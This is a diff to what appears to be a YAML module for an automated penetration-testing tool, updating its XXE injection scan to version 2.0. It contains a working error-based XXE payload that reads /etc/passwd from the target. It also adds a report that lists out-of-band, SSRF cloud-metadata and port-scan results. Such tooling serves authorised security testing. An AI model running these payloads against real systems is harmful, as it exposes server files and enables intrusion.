@@ -1,6 +1,6 @@
 name: "XXE (XML External Entity) Injection"
-description: "XXE detection and exploitation: in-band, blind OOB, error-based, DTD retrieval, parameter entities, and DOCTYPE manipulation"
-version: "1.0"
+description: "XXE detection and exploitation: in-band, blind OOB, error-based, DTD retrieval, parameter entities, XInclude, SOAP, SVG, and SSRF-driven XXE"
+version: "2.0"
 
 vars:
   callback: ""
@@ -123,12 +123,15 @@ steps:
     steps:
       - id: xxe_error_local
         name: "Error-based with local DTD"
-        tool: curl
-        args: ["-s", "-X", "POST",
-               "-H", "Content-Type: application/xml",
-               "-d", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">%eval;%error;]><root>test</root>',
-               "{target}",
-               "-o", "{case_dir}/xxe_error_based.txt"]
+        tool: bash
+        args:
+          - -c
+          - |
+            curl -s -X POST \
+              -H "Content-Type: application/xml" \
+              -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '"'"'file:///nonexistent/%file;'"'"';">">%eval;%error;]><root>test</root>' \
+              "{target}" \
+              -o "{case_dir}/xxe_error_based.txt"
         timeout: 30
         artifacts: ["{case_dir}/xxe_error_based.txt"]
 
@@ -207,14 +210,34 @@ steps:
 
   # ---- Phase 7: Report ----
   - id: report
-    name: "XXE assessment note"
+    name: "XXE assessment report"
+    type: report
+    format: markdown
+    title: "XXE Injection Report — {target}"
+    output: "{case_dir}/xxe-report.md"
+    sections:
+      - heading: "Target"
+        body: "- URL: {target}"
+      - heading: "Technology Detection"
+        body: "- WhatWeb: {case_dir}/whatweb-xxe.txt\n- Content-Type headers: {case_dir}/xxe_headers.txt"
+      - heading: "In-Band XXE"
+        body: "- /etc/passwd: {case_dir}/xxe_etc_passwd.txt\n- Windows boot.ini: {case_dir}/xxe_windows_boot.txt\n- web.xml: {case_dir}/xxe_webxml.txt\n- PHP filter: {case_dir}/xxe_php_src.txt"
+      - heading: "Blind OOB XXE"
+        body: "- HTTP OOB: {case_dir}/xxe_oob_http.txt\n- FTP OOB: {case_dir}/xxe_oob_ftp.txt\n- DTD retrieval: {case_dir}/xxe_dtd_fetch.txt"
+      - heading: "Error-Based XXE"
+        body: "- Local DTD error: {case_dir}/xxe_error_based.txt"
+      - heading: "Parameter Entities & Variants"
+        body: "- Parameter entity: {case_dir}/xxe_parameter_entity.txt\n- XInclude: {case_dir}/xxe_xinclude.txt\n- SOAP: {case_dir}/xxe_soap.txt\n- SVG: {case_dir}/xxe_svg.txt"
+      - heading: "SSRF via XXE"
+        body: "- Cloud metadata: {case_dir}/xxe_ssrf_metadata.txt\n- Port scan: {case_dir}/xxe_ssrf_port.txt"
+      - heading: "Outbound Callbacks"
+        body: "- Monitor {callback} for OOB callbacks"
+
+postflight:
+  - id: cleanup
     type: log
-    message: |
-      XXE assessment complete for {target}.
-      Results in {case_dir}/:
-      - In-band: xxe_etc_passwd.txt, xxe_windows_boot.txt, xxe_webxml.txt, xxe_php_src.txt
-      - Blind OOB: xxe_oob_http.txt, xxe_oob_ftp.txt, xxe_dtd_fetch.txt
-      - Error-based: xxe_error_based.txt
-      - Variants: xxe_parameter_entity.txt, xxe_xinclude.txt, xxe_soap.txt, xxe_svg.txt
-      - SSRF via XXE: xxe_ssrf_metadata.txt, xxe_ssrf_port.txt
-      Monitor {callback} for OOB callbacks.
+    message: "XXE assessment complete — {case_dir}"
+  - id: notify_done
+    type: notify
+    level: success
+    message: "XXE injection scan finished for {target}. Results in {case_dir}"
